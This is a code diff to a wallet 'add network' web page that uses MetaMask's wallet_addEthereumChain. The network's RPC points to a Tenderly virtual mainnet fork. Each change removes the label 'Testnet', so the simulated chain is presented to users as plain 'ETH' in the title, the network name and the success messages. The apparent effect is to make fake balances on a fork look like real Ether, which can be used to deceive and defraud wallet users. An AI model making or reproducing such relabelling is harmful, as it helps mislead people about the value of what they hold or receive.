@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Add ETH Testnet to MetaMask</title>
+  <title>Add ETH to MetaMask</title>
   <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -144,7 +144,7 @@
       <polygon fill="#F5841F" points="0,43.006 8.463,84.308 2.84,82.145 11.783,89.038 4.894,94.427 13.837,102.713 8.249,106.806 21.651,122.174 81.885,104.482 120.456,78.443 14.112,0.002"/>
     </svg>
 
-    <p class="token-name">ETH Testnet</p>
+    <p class="token-name">ETH</p>
     <p class="token-symbol">Add network to your wallet</p>
 
     <button class="btn btn-metamask" onclick="addMetaMask()">
@@ -170,7 +170,7 @@
 
     <div class="meta-row">
       <span class="meta-label">Network Name</span>
-      <span class="meta-value" style="font-family: 'Segoe UI', sans-serif;">ETH Testnet</span>
+      <span class="meta-value" style="font-family: 'Segoe UI', sans-serif;">ETH</span>
     </div>
     <div class="meta-row">
       <span class="meta-label">Chain ID</span>
@@ -185,7 +185,7 @@
   <script>
     const NETWORK = {
       chainId: '0x2707',
-      chainName: 'ETH Testnet',
+      chainName: 'ETH',
       nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
       rpcUrls: ['https://virtual.mainnet.eu.rpc.tenderly.co/d68f8fc9-35e6-46c9-b43d-c8fe52ce1c84'],
       blockExplorerUrls: [],
@@ -209,7 +209,7 @@
           method: 'wallet_addEthereumChain',
           params: [NETWORK],
         });
-        setStatus('ETH Testnet successfully added to MetaMask!', 'success');
+        setStatus('ETH successfully added to MetaMask!', 'success');
       } catch (err) {
         if (err.code === 4001) {
           setStatus('Network addition was cancelled.');
@@ -237,7 +237,7 @@
           params: [NETWORK],
         });
 
-        setStatus('ETH Testnet successfully added to your wallet!', 'success');
+        setStatus('ETH successfully added to your wallet!', 'success');
       } catch (err) {
         if (err.message && err.message.includes('User closed')) {
           setStatus('Connection cancelled.');
